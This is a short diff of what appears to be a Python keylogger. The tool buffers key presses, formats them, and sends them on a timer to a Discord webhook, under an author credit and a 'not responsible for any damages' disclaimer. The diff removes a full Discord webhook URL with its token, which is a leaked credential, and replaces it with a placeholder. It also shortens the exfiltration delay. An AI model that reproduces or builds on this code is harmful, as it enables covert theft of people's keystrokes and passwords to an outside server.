@@ -1,6 +1,7 @@
+# Made By Sirage7474
+# I am not responisble for any damages
 
-
-webhook_url = "https://canary.discord.com/api/webhooks/1377961741715247134/CvMnHZljGryWB7neLeG2c6QCf70kKP9h394Sg4k0ojmMWK2GUAcggEGdK2e6P9JigfWx"
+webhook_url = "YOUR_WEBHOOK_TOKEN"
 
 import os
 import requests
@@ -87,7 +88,7 @@ def schedule_send():
     global send_timer
     if send_timer and send_timer.is_alive():
         send_timer.cancel()
-    send_timer = threading.Timer(2.0, send_data)  # 2 seconden wachttijd
+    send_timer = threading.Timer(1.5, send_data)  # 1.5 sec wait time
     send_timer.start()
 
 def format_key(key):
